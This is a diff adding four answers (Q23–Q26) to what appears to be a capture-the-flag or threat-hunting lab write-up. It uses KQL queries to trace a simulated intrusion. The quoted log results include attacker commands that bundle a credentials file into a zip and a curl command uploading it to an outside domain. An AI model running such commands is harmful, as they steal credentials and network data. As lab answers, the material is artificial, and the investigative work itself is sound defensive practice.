@@ -234,4 +234,53 @@ C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent
 
 **Answer: advanced-ip-scanner.exe**<br><br>
 
+**Q23. What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf).**<br><br>
 
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
+| where process_commandline contains "pdf"
+```
+<br>
+
+First result from the query.<br><br>
+
+```
+cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf
+```
+<br>
+
+**Answer: network_diagrams.pdf**<br><br>
+
+**Q24. What was the name of the file the attackers took that would have contained usernames and passwords?**<br><br>
+The second result from the query in question 23.<br><br>
+
+```
+cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip
+```
+
+**Answer: credentials.txt**<br><br>
+
+**Q25. What was the name of this zip file?**<br><br>
+From previous result, the name of zip file can be obtained.<br><br>
+
+**Answer: important_network_info.zip**<br><br>
+
+**Q26. Which domain did the attackers send the zip to?**<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
+| where process_commandline contains "important_network_info.zip"
+```
+<br>
+The second result from the query shows the domain name.<br><br>
+
+```
+cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload
+```
+<br>
+
+**Answer: nothing-to-see-here.net**<br><br>
